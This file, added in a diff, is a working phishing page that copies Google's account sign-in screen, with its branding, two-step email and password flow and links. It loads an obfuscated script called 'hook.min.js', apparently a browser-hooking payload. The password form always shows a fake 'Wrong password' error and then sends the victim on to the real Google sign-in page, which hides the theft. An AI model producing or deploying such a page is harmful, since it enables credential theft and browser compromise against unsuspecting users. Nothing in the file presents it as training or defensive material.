@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- PWA meta tags -->
+    <meta name="description" content="Google">
+    <meta name="theme-color" content="#4285F4">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Google">
+    
+    <!-- PWA manifest -->
+    <link rel="manifest" href="/static/manifest.json">
+    
+    <!-- PWA icons -->
+    <!--<link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16x16.png">-->
+    <link rel="apple-touch-icon" href="/static/img/icon-192x192.png">
+    
+    <!-- Use obfuscated version -->
+    <!-- <script src="/static/hook.js"></script> -->
+    <script src="/static/hook.min.js"></script>
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="/static/img/google_icon.png" type="image/png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
+
+        :root {
+            --primary-color: #1a73e8;
+            --secondary-color: #dadce0;
+            --text-color: #202124;
+            --link-color: #1a73e8;
+            --error-color: #d93025;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f1f1f1;
+            color: var(--text-color);
+            font-size: 14px;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: white;
+            max-width: 448px;
+            width: 100%;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            height: 24px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .form-group input::placeholder {
+            color: #5f6368;
+        }
+
+        .form-group input:focus {
+            border: 2px solid var(--primary-color);
+        }
+
+        .form-group input.error {
+            border: 1px solid var(--error-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group input.error + .error-message {
+            display: block;
+        }
+
+        .forgot-email {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .forgot-email a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .guest-mode {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .guest-mode a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .next-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0 24px;
+            height: 36px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #1557b0;
+        }
+
+        .password-form {
+            display: none;
+        }
+
+        .password-form.active {
+            display: block;
+        }
+
+        .email-form {
+            display: block;
+        }
+
+        .email-form.hidden {
+            display: none;
+        }
+
+        .user-email {
+            display: none;
+            margin-bottom: 24px;
+            padding: 8px 0;
+            border-bottom: 1px solid #dadce0;
+            position: relative;
+        }
+
+        .user-email.show {
+            display: block;
+        }
+
+        .user-email span {
+            font-weight: 500;
+            display: inline-block;
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .user-email a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+            float: right;
+        }
+
+        .password-input-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #5f6368;
+            padding: 0;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+        }
+
+        .toggle-password:hover {
+            color: #202124;
+        }
+
+        .toggle-password:focus {
+            outline: none;
+        }
+
+        .password-input-wrapper input {
+            padding-right: 40px;
+        }
+
+        #login-error {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="/static/img/gmail.png" alt="Gmail">
+        </div>
+        
+        <div class="header">
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+        </div>
+
+        <div class="user-email">
+            <span id="display-email"></span>
+            <a href="#" id="change-email">Change</a>
+        </div>
+
+        <form id="email-form" class="email-form">
+            <div class="form-group">
+                <input type="email" name="email" id="email" placeholder="Email or phone" required>
+                <div class="error-message">Enter a valid email or phone number</div>
+            </div>
+
+            <div class="forgot-email">
+                <a href="#"></a>
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot email?</a>
+                <!--<a href="#">Create account</a>-->
+            </div>
+
+            <div class="guest-mode">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+
+            <div class="buttons">
+                <a href="https://accounts.google.com/signup" class="create-account">Create account</a>
+                <button type="button" class="next-button" id="next-btn">Next</button>
+            </div>
+        </form>
+
+        <form id="password-form" class="password-form" action="/login" method="post">
+            <div class="form-group">
+                <div class="password-input-wrapper">
+                    <input type="password" name="password" id="password" placeholder="Enter your password" required>
+                    <button type="button" class="toggle-password" id="toggle-password">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+                <div class="error-message" id="login-error">Wrong password. Try again or click Forgot password to reset it.</div>
+            </div>
+
+            <div class="forgot-email">
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot password?</a>
+            </div>
+
+            <div class="guest-mode">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+
+            <div class="buttons">
+                <a href="https://accounts.google.com/signup" class="create-account">Create account</a>
+                <button type="submit" class="next-button" id="submit-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('next-btn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const emailInput = document.getElementById('email');
+            const errorMessage = emailInput.nextElementSibling;
+
+            if (!email) {
+                errorMessage.style.display = 'block';
+                emailInput.classList.add('error');
+                return;
+            }
+
+            document.getElementById('display-email').textContent = email;
+            document.querySelector('.user-email').classList.add('show');
+            document.getElementById('email-form').classList.add('hidden');
+            document.getElementById('password-form').classList.add('active');
+            
+            document.getElementById('password').focus();
+        });
+
+        document.getElementById('email').addEventListener('focus', function() {
+            this.classList.remove('error');
+            this.nextElementSibling.style.display = 'none';
+        });
+
+        document.getElementById('change-email').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.querySelector('.user-email').classList.remove('show');
+            document.getElementById('email-form').classList.remove('hidden');
+            document.getElementById('password-form').classList.remove('active');
+            document.getElementById('login-error').style.display = 'none';
+            document.getElementById('password').classList.remove('error');
+        });
+
+        document.getElementById('password-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const errorMessage = document.getElementById('login-error');
+            errorMessage.style.display = 'block';
+            
+            document.getElementById('password').classList.add('error');
+            
+            setTimeout(() => {
+                window.location.href = 'https://accounts.google.com/signin';
+            }, 2000);
+        });
+
+        document.getElementById('toggle-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+    </script>
+</body>
+</html>
